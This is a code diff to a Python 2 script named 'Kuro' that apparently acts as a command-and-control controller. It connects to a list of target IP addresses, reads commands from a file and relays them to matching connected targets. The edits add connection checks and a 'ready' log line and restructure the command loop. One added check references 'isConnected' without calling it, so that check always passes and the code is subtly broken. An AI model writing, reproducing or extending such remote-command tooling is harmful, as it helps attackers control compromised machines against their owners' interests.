@@ -79,7 +79,8 @@ with open(target_list, "r") as targetFile:
 			# Connect to the target and append the socket to our list
 			target = Target(ip, int(port))
 			target.secureConnect()
-			targets.append(target)
+			if target.isConnected():
+				targets.append(target)
 
 		except KeyboardInterrupt:
 			print "Interrupt detected.  Moving to next target..."
@@ -94,8 +95,9 @@ newThread.start()
 quitFlag = False
 if len(targets) > 0:
 	try:
+		logActivity("[!] Kuro is ready")
 		while True:
-			# Read from cmd.txt, send to targets listed, and clear
+			# Read from cmd.log, send to targets listed, and clear
 			# the file for next use.
 			with open(cmd_list, "r") as cmdFile:
 				for line in cmdFile:
@@ -108,17 +110,16 @@ if len(targets) > 0:
 						quitFlag = True
 					else:
 						for t in targets:
-							if t.addr == addr:
+							if t.addr == addr and t.isConnected:
 								t.send(cmd)
+								
+			# Clear the file
+			open(cmd_list, "w").close()
 				
-				# Clear the file
-				open(cmd_list, "w").close()
+			# Check if it's time to quit
+			if quitFlag:
+				break
 				
-				# Check if it's time to quit
-				if quitFlag:
-					break
-					
-			pass
 	except KeyboardInterrupt:
 		pass
 
